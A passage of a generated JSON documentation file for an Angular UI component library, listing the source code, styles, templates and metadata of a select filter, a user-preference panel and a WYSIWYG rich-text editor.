                    "data": ".sto-select-filter{\n  white-space: nowrap;\n  overflow: hidden;\n  text-overflow: ellipsis;\n  line-height: 36px;\n  text-align: left;\n  text-decoration: none;\n  position: sticky;\n  width: 100%;\n  top: 0;\n  outline: 0;\n  display: flex;\n  flex-direction: row;\n  max-width: 100%;\n  box-sizing: border-box;\n  align-items: center;\n  z-index: 1;\n  .sto-form__field{\n    height: 48px;\n    .mat-form-field-flex {\n      padding: 2px 16px;\n      height: 48px;\n      border-radius: 0;\n      .mat-form-field-prefix{\n        margin-right: 16px;\n      }\n    }\n    .mat-form-field-underline{\n      width: 100%;\n      left: 0;\n      border-bottom-left-radius: 0;\n      border-bottom-right-radius: 0;\n      .mat-form-field-underline .mat-form-field-ripple{\n        border-bottom-left-radius: 0;\n        border-bottom-right-radius: 0;\n      }\n    }\n    &.mat-focused{\n      .mat-form-field-underline .mat-form-field-ripple{\n        border-bottom-left-radius: 0;\n        border-bottom-right-radius: 0;\n      }\n    }\n\n  }\n\n  .sto-form__field .mat-input-wrapper, .sto-form__field .mat-form-field-wrapper{\n    margin: 0;\n  }\n}\n\n\n.sto-select-filter{\n  &__select-all{\n    border-bottom: solid 1px rgba(0, 0, 0, 0.1);\n    width: 100%;\n    &.mat-option{\n      padding: 24px 16px;\n    }\n    &__checkbox{\n      width: 100%;\n      .mat-checkbox-inner-container{\n        margin-right: 16px;\n      }\n      .mat-checkbox-layout, .mat-checkbox-label{\n        width: 100%;\n      }\n    }\n  }\n}\n",
                    "styleUrl": "./sto-select-filter.component.scss"
                }
            ],
            "stylesData": "",
            "jsdoctags": [
                {
                    "pos": 516,
                    "end": 526,
                    "flags": 0,
                    "kind": 288,
                    "atToken": {
                        "pos": 516,
                        "end": 517,
                        "flags": 0,
                        "kind": 57
                    },
                    "tagName": {
                        "pos": 517,
                        "end": 524,
                        "flags": 0,
                        "escapedText": "example"
                    },
                    "comment": "public all = [\"a\", \"b\", \"c\"];\npublic filtered = [];\npublic selectAll(checked: boolean) {\n  this.control.setValue(checked ? all : []);\n}\npublic filter(val: string) {\n    this.filtered = all.filter(x => x === val);\n}\n<mat-select [formControl]=\"control\">\n   <sto-select-filter (valueChanges)=\"filter($event)\" (selectAll)=\"selectAll($event)\"></sto-select-filter>\n   <mat-option *ngFor=\"let v of filtered\">{{ v }}</mat-option>\n</mat-select>"
                }
            ],
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "select",
                        "type": "MatSelect"
                    }
                ],
                "line": 138,
                "jsdoctags": [
                    {
                        "name": "select",
                        "type": "MatSelect",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "OnInit",
                "AfterViewInit",
                "OnDestroy",
                "ControlValueAccessor"
            ],
            "accessors": {
                "value": {
                    "name": "value",
                    "setSignature": {
                        "name": "value",
                        "type": "void",
                        "args": [
                            {
                                "name": "value",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 57,
                        "description": "<p>Initial value of the filter</p>\n",
                        "jsdoctags": [
                            {
                                "name": "value",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    },
                    "getSignature": {
                        "name": "value",
                        "type": "",
                        "returnType": "unknown",
                        "line": 62
                    }
                },
                "total": {
                    "name": "total",
                    "setSignature": {
                        "name": "total",
                        "type": "void",
                        "args": [
                            {
                                "name": "total",
                                "type": "number"
                            }
                        ],
                        "returnType": "void",
                        "line": 70,
                        "description": "<p>Length of unfiltered Array</p>\n",
                        "jsdoctags": [
                            {
                                "name": {
                                    "pos": 1698,
                                    "end": 1703,
                                    "flags": 0,
                                    "escapedText": "total"
                                },
                                "type": "number",
                                "tagName": {
                                    "pos": 1692,
                                    "end": 1697,
                                    "flags": 0,
                                    "escapedText": "param"
                                },
                                "comment": ""
                            }
                        ]
                    },
                    "getSignature": {
                        "name": "total",
                        "type": "number",
                        "returnType": "number",
                        "line": 74
                    }
                },
                "selected": {
                    "name": "selected",
                    "setSignature": {
                        "name": "selected",
                        "type": "void",
                        "args": [
                            {
                                "name": "selected",
                                "type": "number"
                            }
                        ],
                        "returnType": "void",
                        "line": 82,
                        "description": "<p>Determines the checkbox state. Can be checked, indeterminate or unchecked</p>\n",
                        "jsdoctags": [
                            {
                                "name": {
                                    "pos": 1928,
                                    "end": 1936,
                                    "flags": 0,
                                    "escapedText": "selected"
                                },
                                "type": "number",
                                "tagName": {
                                    "pos": 1922,
                                    "end": 1927,
                                    "flags": 0,
                                    "escapedText": "param"
                                },
                                "comment": ""
                            }
                        ]
                    },
                    "getSignature": {
                        "name": "selected",
                        "type": "number",
                        "returnType": "number",
                        "line": 96
                    }
                }
            },
            "templateData": "<div class=\"sto-form\" style=\"width: 100%\" *ngIf=\"isFilter;else noFilter\">\n  <mat-form-field class=\"sto-form__field sto-form__field--without-placeholder\"\n                  floatLabel=\"never\">\n        <span matPrefix\n              *ngIf=\"isMulti !== false\">\n            <mat-checkbox color=\"primary\"\n           class=\"sto-select-filter__checkbox\"\n           #selectAll\n           [indeterminate]=\"indeterminate\"\n           [formControl]=\"checkboxControl\">\n        </mat-checkbox>\n        </span>\n        <mat-label>Search in list</mat-label>\n        <input [formControl]=\"inputControl\"\n               #inputElement\n               class=\"sto-select-filter__searchfield\"\n               autocomplete=\"off\"\n               matInput>\n        <mat-icon *ngIf=\"inputControl.value?.length > 0\"\n                  class=\"mat__icon--clickable\"\n                  (click)=\"inputControl.reset()\"\n                  matSuffix>close</mat-icon>\n        <mat-icon *ngIf=\"inputControl.value?.length <= 0\"\n                  matSuffix>search</mat-icon>\n    </mat-form-field>\n</div>\n<ng-template #noFilter>\n    <div class=\"sto-select-filter__select-all mat-option\">\n        <mat-checkbox color=\"primary\"\n                      class=\"sto-select-filter__select-all__checkbox \"\n                      #selectAll\n                      [indeterminate]=\"indeterminate\"\n                      [formControl]=\"checkboxControl\">\n           All\n        </mat-checkbox>\n    </div>\n</ng-template>\n\n\n\n"
        },
        {
            "name": "StoUserPreferenceComponent",
            "id": "component-StoUserPreferenceComponent-0630fc6e8971c6b10bc744a722c7266e",
            "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-user-preference",
            "styleUrls": [
                "./sto-user-preference.component.css"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-user-preference.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [],
            "outputsClass": [],
            "propertiesClass": [
                {
                    "name": "destroyed$",
                    "defaultValue": "new Subject<boolean>()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 15,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "form",
                    "type": "FormGroup",
                    "optional": false,
                    "description": "",
                    "line": 14,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "initForm",
                    "args": [
                        {
                            "name": "value",
                            "type": "boolean"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 20,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "boolean",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 44
                },
                {
                    "name": "ngOnInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 33
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import {Component, OnDestroy, OnInit} from '@angular/core';\nimport {FormBuilder, FormGroup} from '@angular/forms';\nimport {take, takeUntil} from 'rxjs/operators';\nimport {Subject} from 'rxjs';\nimport {StoUserPreferenceService} from './sto-user-preference.service';\n\n@Component({\n  selector: 'sto-user-preference',\n  templateUrl: './sto-user-preference.component.html',\n  styleUrls: ['./sto-user-preference.component.css']\n})\nexport class StoUserPreferenceComponent implements OnInit, OnDestroy {\n\n  public form: FormGroup;\n  private destroyed$ = new Subject<boolean>();\n\n  constructor(private fb: FormBuilder, private service: StoUserPreferenceService) {\n  }\n\n  private initForm(value: boolean ) {\n    this.form = this.fb.group({\n      hasSelectTextOnFocusEnabled: [value]\n    });\n    this.form.get('hasSelectTextOnFocusEnabled')?.valueChanges\n      .pipe(\n        takeUntil(this.destroyed$)\n      )\n      .subscribe((hasSelectTextOnFocusEnabled) => {\n        this.service.setHasSelectTextOnFocusEnabled(hasSelectTextOnFocusEnabled);\n      });\n  }\n\n  ngOnInit() {\n    this.service.hasSelectTextOnFocusEnabled.asObservable()\n      .pipe(\n        take(1)\n      )\n      .subscribe((value) => {\n        this.initForm(value);\n      });\n\n  }\n\n  ngOnDestroy() {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "",
                    "styleUrl": "./sto-user-preference.component.css"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "fb",
                        "type": "FormBuilder"
                    },
                    {
                        "name": "service",
                        "type": "StoUserPreferenceService"
                    }
                ],
                "line": 15,
                "jsdoctags": [
                    {
                        "name": "fb",
                        "type": "FormBuilder",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "service",
                        "type": "StoUserPreferenceService",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "OnInit",
                "OnDestroy"
            ],
            "templateData": "<mat-expansion-panel [expanded]=\"false\">\n  <mat-expansion-panel-header>\n    <mat-panel-title>Settings<span style=\"opacity: 0.36\">&nbsp;(beta)</span></mat-panel-title>\n  </mat-expansion-panel-header>\n  <div *ngIf=\"form\" class=\"sto-grid sto-grid--4\">\n\n    <ng-content></ng-content>\n\n  </div>\n</mat-expansion-panel>\n"
        },
        {
            "name": "WysiwygActionsComponent",
            "id": "component-WysiwygActionsComponent-8b22bcd622cda01c8e154d3cd397d163",
            "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg-actions/wysiwyg-actions.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-wysiwyg-actions",
            "styleUrls": [
                "./wysiwyg-actions.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./wysiwyg-actions.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "active",
                    "line": 10,
                    "type": "string[]"
                },
                {
                    "name": "disabled",
                    "line": 12,
                    "type": "boolean"
                }
            ],
            "outputsClass": [
                {
                    "name": "modifier",
                    "defaultValue": "new EventEmitter<string>()",
                    "line": 14,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [],
            "methodsClass": [],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import { Component, EventEmitter, Input, Output } from '@angular/core';\n\n@Component({\n  selector: 'sto-wysiwyg-actions',\n  templateUrl: './wysiwyg-actions.component.html',\n  styleUrls: [ './wysiwyg-actions.component.scss' ]\n})\nexport class WysiwygActionsComponent {\n  @Input()\n  active: string[];\n  @Input()\n  disabled: boolean;\n  @Output()\n  modifier = new EventEmitter<string>();\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": ".sto-wysiwyg {\n\n}\n",
                    "styleUrl": "./wysiwyg-actions.component.scss"
                }
            ],
            "stylesData": "",
            "templateData": "<div class=\"sto-wysiwyg__actions\">\n  <div class=\"sto-wysiwyg__buttons\">\n    <ng-container *ngIf=\"!disabled\">\n      <mat-button-toggle-group [multiple]=\"true\"\n                               [value]=\"active\">\n        <mat-button-toggle value=\"bold\"\n                           title=\"Bold (ctrl + b)\"\n                           (change)=\"modifier.emit($event.value)\">\n          <mat-icon>format_bold</mat-icon>\n        </mat-button-toggle>\n        <mat-button-toggle value=\"italic\"\n                           title=\"Italic (ctrl + i)\"\n                           (change)=\"modifier.emit($event.value)\">\n          <mat-icon>format_italic</mat-icon>\n        </mat-button-toggle>\n        <mat-button-toggle value=\"underline\"\n                           title=\"Underline (ctrl + u)\"\n                           (change)=\"modifier.emit($event.value)\">\n          <mat-icon>format_underline</mat-icon>\n        </mat-button-toggle>\n      </mat-button-toggle-group>\n      <div class=\"divider\"></div>\n      <button mat-flat-button\n              title=\"Insert hyperlink\"\n              (click)=\"modifier.emit('createLink')\"\n              class=\"sto-wysiwyg__editor__button\">\n        <mat-icon>link</mat-icon>\n      </button>\n      <div class=\"divider\"></div>\n      <button mat-flat-button\n              title=\"Create unordered list\"\n              (click)=\"modifier.emit('insertUnorderedList')\"\n              class=\"sto-wysiwyg__editor__button\">\n        <mat-icon>format_list_bulleted</mat-icon>\n      </button>\n      <button mat-flat-button\n              title=\"Create ordered list\"\n              (click)=\"modifier.emit('insertOrderedList')\"\n              class=\"sto-wysiwyg__editor__button\">\n        <mat-icon>format_list_numbered</mat-icon>\n      </button>\n      <div class=\"divider\"></div>\n      <button mat-flat-button\n              title=\"Clear formatting on selection\"\n              (click)=\"modifier.emit('removeFormat')\"\n              class=\"sto-wysiwyg__editor__button\">\n        <mat-icon>format_clear</mat-icon>\n      </button>\n    </ng-container>\n  </div>\n  <div class=\"user-buttons\">\n    <ng-content></ng-content>\n  </div>\n</div>\n"
        },
        {
            "name": "WysiwygComponent",
            "id": "component-WysiwygComponent-99816336a948052769be37cfa2ca69e4",
            "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [
                {
                    "name": "{\n    provide: NG_VALUE_ACCESSOR, useExisting: forwardRef(() => WysiwygComponent), multi: true\n}",
                    "type": "component"
                }
            ],
            "selector": "sto-wysiwyg",
            "styleUrls": [
                "./wysiwyg.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./wysiwyg.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "readonly",
                    "line": 39,
                    "type": "boolean"
                }
            ],
            "outputsClass": [],
            "propertiesClass": [
                {
                    "name": "active",
                    "defaultValue": "[]",
                    "type": "string[]",
                    "optional": false,
                    "description": "",
                    "line": 44,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "destroyed$",
                    "defaultValue": "new Subject<boolean>()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 40,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "editor",
                    "type": "ElementRef<HTMLDivElement>",
                    "optional": false,
                    "description": "",
                    "line": 42,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "WysiwygEditorComponent, {read: ElementRef}"
                        }
                    ]
                },
                {
                    "name": "onTouched",
                    "type": "unknown",
                    "optional": false,
                    "description": "",
                    "line": 45,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "propagateChange",
                    "defaultValue": "() => {...}",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 115
                },
                {
                    "name": "value",
                    "type": "SafeHtml",
                    "optional": false,
                    "description": "",
                    "line": 43,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "execute",
                    "args": [
                        {
                            "name": "method",
                            "type": "string"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 77,
                    "jsdoctags": [
                        {
                            "name": "method",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "listenForSelectEvents",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 63,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "ngAfterViewInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 54
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 58
                },
                {
                    "name": "onKeyDownHandleTab",
                    "args": [
                        {
                            "name": "event",
                            "type": "KeyboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 94,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "KeyboardEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "registerOnChange",
                    "args": [
                        {
                            "name": "fn",
                            "type": "never"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 119,
                    "jsdoctags": [
                        {
                            "name": "fn",
                            "type": "never",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "registerOnTouched",
                    "args": [
                        {
                            "name": "fn",
                            "type": "unknown"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 123,
                    "jsdoctags": [
                        {
                            "name": "fn",
                            "type": "unknown",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setDisabledState",
                    "args": [
                        {
                            "name": "isDisabled",
                            "type": "boolean"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 127,
                    "jsdoctags": [
                        {
                            "name": "isDisabled",
                            "type": "boolean",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "valueChanged",
                    "args": [
                        {
                            "name": "value",
                            "type": "string"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 132,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "writeValue",
                    "args": [
                        {
                            "name": "value",
                            "type": "string"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 107,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectionStrategy,\n  ChangeDetectorRef,\n  Component,\n  ElementRef,\n  forwardRef,\n  Input,\n  NgZone,\n  OnDestroy,\n  SecurityContext,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { DomSanitizer, SafeHtml } from '@angular/platform-browser';\nimport { fromEvent, merge, Subject } from 'rxjs';\nimport { debounceTime, filter, takeUntil } from 'rxjs/operators';\nimport { WysiwygEditorComponent } from './wysiwyg-editor/wysiwyg-editor.component';\nimport { Modifiers, validCommands } from './modifiers';\nimport { ControlValueAccessor, NG_VALUE_ACCESSOR } from '@angular/forms';\n\n@Component({\n  selector: 'sto-wysiwyg',\n  templateUrl: './wysiwyg.component.html',\n  styleUrls: [ './wysiwyg.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  providers: [\n    {\n      provide: NG_VALUE_ACCESSOR,\n      useExisting: forwardRef(() => WysiwygComponent),\n      multi: true\n    }\n  ],\n})\nexport class WysiwygComponent implements AfterViewInit, OnDestroy, ControlValueAccessor {\n  // eslint-disable-next-line @angular-eslint/no-input-rename\n  @Input('readonly')\n  disabled: boolean;\n  private destroyed$ = new Subject<boolean>();\n  @ViewChild(WysiwygEditorComponent, { read: ElementRef })\n  editor: ElementRef<HTMLDivElement>;\n  public value: SafeHtml;\n  public active: string[] = [];\n  public onTouched: unknown;\n\n  constructor(\n    private domSanitizer: DomSanitizer,\n    private zone: NgZone,\n    private cdr: ChangeDetectorRef\n  ) {\n  }\n\n  ngAfterViewInit() {\n    this.listenForSelectEvents();\n  }\n\n  ngOnDestroy(): void {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n  private listenForSelectEvents() {\n    merge(\n      fromEvent(this.editor.nativeElement, 'mouseup'),\n      fromEvent<KeyboardEvent>(this.editor.nativeElement, 'keyup')\n        .pipe(\n          filter((ev) => ( ev.ctrlKey && ev.key === 'A' ) || ( /Arrow/.test(ev.key) ))\n        )\n    ).pipe(debounceTime(200), takeUntil(this.destroyed$))\n      .subscribe(() => {\n        this.active = Modifiers.getActiveModifiers();\n        this.cdr.detectChanges();\n      });\n  }\n\n  execute(method: string) {\n    if ( !validCommands.includes(method) ) {\n      return;\n    }\n    const showUi = method === 'createLink';\n    if ( showUi ) {\n      const url = window.prompt('url');\n      if ( url ) {\n        document.execCommand(method, false, url);\n      }\n    } else {\n      document.execCommand(method, false, '');\n    }\n    this.active = Modifiers.getActiveModifiers();\n    this.cdr.detectChanges();\n  }\n\n  onKeyDownHandleTab(event: KeyboardEvent) {\n    if ( event.key === 'Tab' ) {\n      event.preventDefault();\n      let method: string;\n      if ( event.shiftKey ) {\n        method = 'outdent';\n      } else {\n        method = 'indent';\n      }\n      this.execute(method);\n    }\n  }\n\n  writeValue(value: string): void {\n    if ( value ) {\n      const sanitized = this.domSanitizer.sanitize(SecurityContext.HTML, value) ?? '';\n      this.value = this.domSanitizer.bypassSecurityTrustHtml(sanitized);\n      this.cdr.detectChanges();\n    }\n  }\n  // eslint-disable-next-line\n  propagateChange = (value: unknown) => {\n    console.log(value); // To remove eslint warning..\n  };\n\n  registerOnChange(fn: never): void {\n    this.propagateChange = fn;\n  }\n\n  registerOnTouched(fn: unknown): void {\n    this.onTouched = fn;\n  }\n\n  setDisabledState(isDisabled: boolean): void {\n    this.disabled = isDisabled;\n    this.cdr.detectChanges();\n  }\n\n  valueChanged(value: string) {\n    this.propagateChange(value);\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": ".sto-wysiwyg {\n  .mat-button-toggle-appearance-standard .mat-button-toggle-label-content {\n    line-height: 36px;\n    padding: 0 6px;\n  }\n\n  &__editor {\n    &__button {\n      min-width: 40px;\n      width: 40px;\n      padding: 0;\n    }\n  }\n\n  &__actions {\n    display: flex;\n    justify-content: space-between;\n    align-items: flex-end;\n    flex-wrap: wrap;\n    min-height: 44px;\n    padding-bottom: 2px;\n\n    .divider {\n      height: 36px;\n      width: 0;\n      margin: 0 4px;\n    }\n\n    .mat-button-toggle-group {\n      border: none;\n\n      .mat-button-toggle {\n        border-left: none;\n        margin-left: 2px;\n\n        &:first-of-type {\n          margin-left: 0;\n        }\n      }\n    }\n  }\n\n\n  min-height: 100px;\n  max-height: 100%;\n  overflow: hidden;\n  height: 100%;\n  border-radius: 2px;\n  padding: 4px 0 8px;\n  display: flex;\n  flex-direction: column;\n\n  &__buttons {\n    flex: 1 1 auto;\n    display: flex;\n    justify-content: flex-start;\n  }\n\n  &__actions {\n    .user-buttons {\n      button {\n        margin: 8px 4px 0;\n      }\n    }\n  }\n\n  &__editor {\n\n    transition: border-color 300ms ease, background-color 200ms ease, height 200ms ease;\n    border-radius: 2px;\n    outline: none;\n    margin-top: 4px;\n    padding: 12px 4px 4px;\n    flex: 1 1 auto;\n    line-height: 18px;\n    overflow: auto;\n\n    &--readonly {\n      background: transparent;\n      border-width: 0;\n    }\n\n    p {\n      margin-bottom: 0;\n    }\n  }\n}\n",
                    "styleUrl": "./wysiwyg.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "domSanitizer",
                        "type": "DomSanitizer"
                    },
                    {
                        "name": "zone",
                        "type": "NgZone"
                    },
                    {
                        "name": "cdr",
                        "type": "ChangeDetectorRef"
                    }
                ],
                "line": 45,
                "jsdoctags": [
                    {
                        "name": "domSanitizer",
                        "type": "DomSanitizer",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "zone",
                        "type": "NgZone",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "cdr",
                        "type": "ChangeDetectorRef",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "AfterViewInit",
                "OnDestroy",
                "ControlValueAccessor"
            ],
            "templateData": "<div class=\"sto-wysiwyg\">\n  <sto-wysiwyg-actions [active]=\"active\"\n                       [disabled]=\"disabled\"\n                       (modifier)=\"execute($event)\">\n    <ng-content></ng-content>\n  </sto-wysiwyg-actions>\n  <sto-wysiwyg-editor [readonly]=\"disabled\"\n                      [content]=\"value\"\n                      (valueChanged)=\"valueChanged($event)\"\n                      (keydown)=\"onKeyDownHandleTab($event)\"></sto-wysiwyg-editor>\n</div>\n"
        },
        {
            "name": "WysiwygEditorComponent",
            "id": "component-WysiwygEditorComponent-4cbe1ca87915500e36e09ac7cd0f63b2",
            "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg-editor/wysiwyg-editor.component.ts",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-wysiwyg-editor",
            "styleUrls": [
                "./wysiwyg-editor.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./wysiwyg-editor.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "content",
                    "line": 13,
                    "type": "SafeHtml"
                },
                {
                    "name": "readonly",
                    "line": 15,
                    "type": "boolean"
                }
            ],
            "outputsClass": [
                {
                    "name": "valueChanged",
                    "defaultValue": "new EventEmitter<string>()",
                    "line": 19,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [
                {
                    "name": "destroyed$",
                    "defaultValue": "new Subject<boolean>()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 22,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "editor",
                    "type": "ElementRef<HTMLDivElement>",
                    "optional": false,
                    "description": "",
                    "line": 17,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "'editor'"
                        }
                    ]
                },
                {
                    "name": "warning",
                    "type": "string | null",
                    "optional": false,
                    "description": "",
                    "line": 20,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "insertImage",
                    "args": [
                        {
                            "name": "img",
                            "type": "File"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 104,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "img",
                            "type": "File",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "listenForValueChange",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 37,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "ngAfterViewInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 33
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 28
                },
                {
                    "name": "onDrop",
                    "args": [
                        {
                            "name": "event",
                            "type": "DragEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 134,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "DragEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "onPaste",
                    "args": [
                        {
                            "name": "event",
                            "type": "ClipboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 48,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "ClipboardEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "pasteText",
                    "args": [
                        {
                            "name": "event",
                            "type": "ClipboardEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 64,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "ClipboardEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "stripImageSection",
                    "args": [
                        {
                            "name": "html",
                            "type": "string"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 89,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "html",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
